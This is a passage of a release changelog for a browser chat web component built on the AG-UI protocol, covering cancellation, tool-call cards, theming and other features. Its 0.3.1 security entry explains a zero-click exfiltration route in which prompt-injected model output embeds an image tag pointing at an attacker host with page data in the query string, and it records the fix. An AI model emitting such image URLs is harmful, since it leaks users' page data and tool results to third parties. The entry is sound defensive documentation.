  server observes the disconnect) and stops the multi-round run loop: tool
  calls collected before the abort are not executed and no further round
  starts (a frontend tool handler already running completes, but its result
  doesn't trigger a re-run). Safe no-op with no run in flight.
- **`onCancelled()` handler** on `AgUiClientHandlers` — the deliberate-stop
  sibling of `onError`. Partial assistant text stays in the transcript and
  is persisted (`onPersist`), so a reload shows the truncated exchange;
  `onSettled` still fires (terminal-rest guarantee). Both the
  abort-resolves and abort-rejects behaviours of `@ag-ui/client` are
  handled (its `runAgent` filters `AbortError` and resolves normally;
  re-throwing versions are caught via the error's name).
- **The Send button becomes Stop while a run is in flight** — same button,
  label + `aria-label` swap, `data-state="running"` for styling — through
  the whole interaction including between tool rounds. **Escape** in the
  composer also cancels (only when the skills palette is closed; the
  palette keeps its own Escape). After a cancel the transcript gets a muted
  **"⏹ Stopped"** note (`.stopped-note`), not an error bubble.
- **Cancelling declines an open confirmation card.**
  `requestConfirmation` accepts `ConfirmationOptions` with an
  `AbortSignal`; aborting resolves the pending decision as declined
  (`data-resolved="declined"`). A decision already made wins over a late
  abort.

### Changed

- `newChat()` now cancels any in-flight run before discarding the client —
  previously the old agent kept streaming into a cleared transcript.
- The Send button is no longer `disabled` during a run (it's the Stop
  control now); `AgUiClientHandlers.onCancelled` is required, so hosts
  implementing the handlers interface must add it.

## [0.3.1] — 2026-06-10

### Security

- **`<img>` is stripped from rendered assistant markdown by default.** A
  model-controlled `<img src="https://attacker/?d=...">` is fetched by the
  browser with no user interaction, which made the sanitizer allowlist a
  zero-click exfiltration channel for prompt-injected page data (page maps,
  state hooks, tool results). Hosts that trust their content can opt back in
  via the new `allowImages` element property (or `renderMarkdown(text,
  { allowImages: true })`); when enabled, DOMPurify still strips event
  handlers and `javascript:` URLs as before.

### Fixed

- **Rotated headers now reach the agent stream.** `HttpAgent` is built once
  per conversation with the headers baked into its constructor, so a rotated
  token (CSRF, short-lived JWT) never reached the agent endpoint and long
  sessions 401'd mid-conversation — even though the skills/tools catalog
  fetches already re-read `headers` per request. The element now passes a
  live `getHeaders` callback to the agent factory and `createHttpAgent`'s
  fetch wrapper overlays the fresh values on every request. Custom
  `agentFactory` implementations can read the new optional
  `HttpAgentOptions.getHeaders` to do the same.
- **Removed the phantom `./style.css` export.** `package.json` advertised
  `@artooi/ag-ui-web-component/style.css` → `dist/ag-ui-web-component.bundle.css`,
  but the build emits no CSS file (styles live as JS strings and are injected
  into the Shadow DOM), so importing the advertised path always failed.
- **The shared `marked` singleton is no longer mutated.** Module-scope
  `marked.setOptions({ gfm, breaks })` clobbered a host app's `marked`
  configuration whenever the dependency was deduped. Rendering now uses a
  local `Marked` instance; the global keeps its defaults.

### Added

- **Auto-prettified tool-card labels.** When no label is found anywhere in
  the chain (`x-summary` → `toolSummaries` → fetched `data-tools-url`
  catalog), cards now fall back to a prettified name (`list_projects` →
  "List projects") instead of the raw identifier. Exported as
  `prettifyToolName`.

## [0.3.0] — 2026-06-03

### Added
- **`data-tools-url` — server tool-label catalog.** On connect the element
  fetches a JSON catalog (`[{ name, summary, description? }]`) from the URL
  (with `headers`) and uses it to label tool-call cards for **server-side tools**
  whose schema never reaches the browser. Pairs with django-ag-ui's `tools/`
  endpoint, so a tool's label flows from its server-side source (drf-mcp
  `display_name`, `@tool(summary=…)`) with no per-tool client duplication.
  Per-card label precedence: the tool's own `x-summary` → an explicit
  `toolSummaries` entry → the fetched catalog → the raw name. Exports the
  `ToolCatalogEntry` type and the `parseToolCatalog` helper.

## [0.2.2] — 2026-06-02

### Added
- **Friendly tool-call card labels.** The built-in tools now carry `x-summary`
  labels (`navigate_to_route` → "Navigate", `list_routes` → "List pages",
  `read_page` → "Read the page", state-hook `read_*`/`set_*` → "Read/Update
  <name>"). For tools whose schema never reaches the browser — **server-side
  tools** (drf-mcp, `@tool` registry) — a new `toolSummaries: Record<string,
  string>` property maps tool name → label as a fallback (e.g.
  `chat.toolSummaries = { list_projects: "Search projects" }`).

### Changed
- A tool call that ends with **no client handler and no `TOOL_CALL_RESULT`** now
  settles the card as **"No result returned."** instead of the misleading
  "Executed on the server." (nothing executed it).

### Fixed
- **Incoming-text animations no longer double-fire.** Two distinct cases:
  - *End of stream:* `data-text-animation="word"` wrapped the finished assistant
    message into staggered `.word` spans on `TEXT_MESSAGE_END`, so a response
    that had already streamed in re-animated itself one word at a time. The word
    reveal now runs only when a message arrives **at once** (single text delta,
    or an error bubble); a message streamed across multiple deltas keeps its
    progressive reveal and isn't re-wrapped.
  - *Reload from memory:* on rehydrate the whole transcript mounts at once, so
    every restored assistant bubble animated its text in parallel (fade) or
    re-wrapped word-by-word — wrong, since it's old content, not arriving. Restored
    bubbles are now marked `message--restored`, excluded from the fade entrance
    animation and never word-wrapped, so history appears statically.

## [0.2.1] — 2026-06-02

### Added
- **Server-side tool results in the card.** The element now subscribes to
  AG-UI's `TOOL_CALL_RESULT` event and settles the matching tool-call card with
  the real server output (honouring the `data-tool-display` mode), instead of
  the generic "Executed on the server." placeholder — which remains only as a
  fallback when no result event is streamed.
- **Tool calls and results survive a page refresh.** History replay now
  reconstructs tool-call cards (from assistant `toolCalls`) and settles them
  from the persisted `tool` result messages, so a rehydrated transcript shows
  the full tool activity, not just the prose. Applies to every conversation
  store (the data was already persisted; only the replay was incomplete).

### Fixed
- **Pending indicator could hang after a server-only round.** A round whose
  tool calls were all server-side re-showed the "thinking" indicator after the
  run had already finished, leaving it stuck. The indicator is no longer shown
  speculatively for server tools, and a terminal `onSettled` guarantee clears
  it (and re-enables input) on every run-loop exit — including the
  `MAX_TOOL_ROUNDS` ceiling and errors.

## [0.2.0] — 2026-06-02

### Added
- **Markdown + HTML rendering** in assistant message bubbles (`renderMarkdown`),
  sanitised with DOMPurify (scripts, event handlers, and `javascript:` URLs
  stripped; links hardened with `target`/`rel`). User messages stay literal.
- **Pending indicator** — an animated "thinking" indicator shown while the agent
  is awaited (before the first token and between tool rounds), honouring
  `prefers-reduced-motion`.
- **New-chat button** in the header — clears the transcript, the persisted
  conversation, and the in-memory run state, and mints a fresh thread.
- **Collapse seam** — a reflected `collapsed` attribute, a built-in header
  toggle, a persisted (per-tab) collapsed state, and a `TOGGLE_EVENT`
  (`ag-ui-toggle`) so a host can drive its own chrome.
- **Tool-call display modes** (`TOOL_DISPLAY`, `data-tool-display`): `minimal`
  (name + status), `compact` (args + result behind one "Details" toggle), and
  `full` (the default; original behaviour).
- **Richer action animations**: `pressThenClick`, `selectOption`,
  `toggleControl` (+ `pressButton` / `selectControl` / `toggleCheckbox` driver
  wrappers), all honouring `prefers-reduced-motion`.
- **Dynamic route syntax**: `Route.path` supports `:name` placeholders;
  `navigate_to_route` substitutes path params (leftover params → query string)
  and `list_routes` advertises each route's `pathParams`.
- `X_CONFIRM_KEY` (`x-confirm`) tool metadata for a human-readable confirmation
  prompt.
- `setNativeValue` / `setNativeChecked` utilities (also used internally).
- **Theming** — a `theme` attribute (`light` / `dark` / `auto` / `code`); `auto`
  follows `prefers-color-scheme`, `code` is a monospace terminal palette. Plus a
  wider set of themeable `--ag-ui-*` variables.
- **Density + placement presets** — `density` (`comfortable` / `compact`) and
  `placement` (`bottom-left` / `side` / `full` / `embedded`); `embedded` drops
  the floating chrome and high z-index so the widget lives in the host layout.
- **Incoming-text animations** — `data-text-animation` (`none` / `fade` /
  `word`), the last revealing assistant text word-by-word; honours
  `prefers-reduced-motion`.
- **`confirmPredicate`** — a per-call `(toolName, args) => boolean | Promise`
  hook deciding confirmation dynamically (authoritative over `x-destructive`).
- **Built-in `read_page` tool** — present when a `getPageMap` provider is set, so
  the agent can re-read the page mid-turn after acting.
- **`x-summary`** tool metadata (`X_SUMMARY_KEY`) — a friendly label shown on the
  tool-call card instead of the raw tool name.
- `observedAttributes` / `attributeChangedCallback` so a late `title-text`
  change updates the header.
- Accessibility: `role="log"`/`aria-live` on the transcript, `role="status"` on
  the pending indicator, `role="group"` on the confirmation card, input label.
- **Skills** — pre-defined prompts surfaced as **chips** (`data-prompt-chips`)
  and/or a **`/`-command palette** (`data-slash-commands`), both opt-in over one
  catalog. Catalog from the `skills` setter (`setSkills`), a `data-skills` JSON
  embed, and/or a fetched `data-skills-url` (merged backend → embed → client).
  Picking pre-fills the input (or auto-sends with `sendImmediately`); prompts
  support `{placeholder}`s filled from `skillContext`, with a missing value
  blocking the send and showing a hint. Exports the `Skill` type.

### Changed
- The destructive-action confirmation is now an **inline card in the transcript**
  (Confirm / Cancel, with the `x-confirm` message) instead of a focus-stealing
  modal overlay. `requestConfirmation` now renders inline; the
  `confirmation_modal` module was removed.
- **Framework-controlled inputs now work.** `fillField` / `typeInto` /
  `selectOption` / `toggleControl` / `setControlValue` set `value` / `checked`
  through the **native prototype setter** before dispatching `input`, so
  React/Vue/Svelte value-tracking sees the change (previously the field looked
  filled but host state stayed empty).
- **Framework interop:** reflecting **property setters** for `endpoint`,
  `toolDisplay`, and `collapsed` (React 19 assigns matching props as element
  properties — getter-only props previously threw).
- `registerTool` is now **idempotent** — re-registering a tool name replaces it
  instead of throwing (re-fired refs / React StrictMode).

### Fixed
- The Markdown/HTML allowlist now permits sanitised **`<img>`** (safe-scheme
  `src`, no event handlers); `javascript:` srcs and disallowed tags (e.g.
  `iframe`) are still stripped.

## [0.1.1] — 2026-06-01

### Changed
- CI: resolve the pnpm version from `package.json`'s `packageManager` only
  (dropped the conflicting `version` input in the release/test workflows).

### Notes
- First fully-automated release via the npm OIDC publish pipeline — 0.1.0 was
  the manual bootstrap publish that created the package.

## [0.1.0] — 2026-06-01

### Added
- `<ag-ui-chat>` Web Component over AG-UI: Shadow-DOM chat UI, a pluggable tool
  registry (`registerTool`), the `x-destructive` confirmation modal, and the
  DOM-driver + animation primitives.
- Durable conversation + resumable run loop that survives the full page reloads
  of a multi-page app: `SessionStorageStore`, a persisted thread id, and
  `x-navigates` checkpoints completed via `navigationResult` on the next mount.
- Host seams: `routeMap` (+ `list_routes` / `navigate_to_route`), an
  auto-injected `getPageMap` context, `registerStateHook`, and an optional
  client-side `navigate()` callback (SPA vs MPA).

### Notes
- First release — exercising the automated npm OIDC publish pipeline end-to-end.

[Unreleased]: https://github.com/Artui/ag-ui-web-component/compare/v0.34.0...HEAD
[0.34.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.33.1...v0.34.0
[0.33.1]: https://github.com/Artui/ag-ui-web-component/compare/v0.33.0...v0.33.1
[0.33.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.32.0...v0.33.0
[0.32.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.31.1...v0.32.0
[0.31.1]: https://github.com/Artui/ag-ui-web-component/compare/v0.31.0...v0.31.1
[0.31.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.30.0...v0.31.0
[0.30.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.29.0...v0.30.0
[0.29.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.28.0...v0.29.0
[0.28.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.27.0...v0.28.0
[0.27.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.26.1...v0.27.0
[0.26.1]: https://github.com/Artui/ag-ui-web-component/compare/v0.26.0...v0.26.1
[0.26.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.25.2...v0.26.0
[0.25.2]: https://github.com/Artui/ag-ui-web-component/compare/v0.25.1...v0.25.2
[0.25.1]: https://github.com/Artui/ag-ui-web-component/compare/v0.25.0...v0.25.1
[0.25.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.24.0...v0.25.0
[0.24.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.23.1...v0.24.0
[0.23.1]: https://github.com/Artui/ag-ui-web-component/compare/v0.23.0...v0.23.1
[0.23.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.22.0...v0.23.0
[0.22.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.21.0...v0.22.0
[0.21.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.20.1...v0.21.0
[0.20.1]: https://github.com/Artui/ag-ui-web-component/compare/v0.20.0...v0.20.1
[0.20.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.19.0...v0.20.0
[0.19.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.18.0...v0.19.0
[0.18.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.17.0...v0.18.0
[0.17.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.16.0...v0.17.0
[0.16.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.15.0...v0.16.0
[0.15.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.14.1...v0.15.0
[0.14.1]: https://github.com/Artui/ag-ui-web-component/compare/v0.14.0...v0.14.1
[0.14.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.13.0...v0.14.0
[0.13.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.12.0...v0.13.0
[0.12.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.11.0...v0.12.0
[0.11.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.10.0...v0.11.0
[0.10.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.9.0...v0.10.0
[0.9.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.8.1...v0.9.0
[0.8.1]: https://github.com/Artui/ag-ui-web-component/compare/v0.8.0...v0.8.1
[0.8.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.7.0...v0.8.0
[0.7.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.6.0...v0.7.0
[0.6.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.5.0...v0.6.0
[0.5.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.4.0...v0.5.0
[0.4.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.3.1...v0.4.0
[0.3.1]: https://github.com/Artui/ag-ui-web-component/compare/v0.3.0...v0.3.1
[0.3.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.2.2...v0.3.0
[0.2.2]: https://github.com/Artui/ag-ui-web-component/compare/v0.2.1...v0.2.2
[0.2.1]: https://github.com/Artui/ag-ui-web-component/compare/v0.2.0...v0.2.1
[0.2.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.1.1...v0.2.0
[0.1.1]: https://github.com/Artui/ag-ui-web-component/compare/v0.1.0...v0.1.1
[0.1.0]: https://github.com/Artui/ag-ui-web-component/releases/tag/v0.1.0
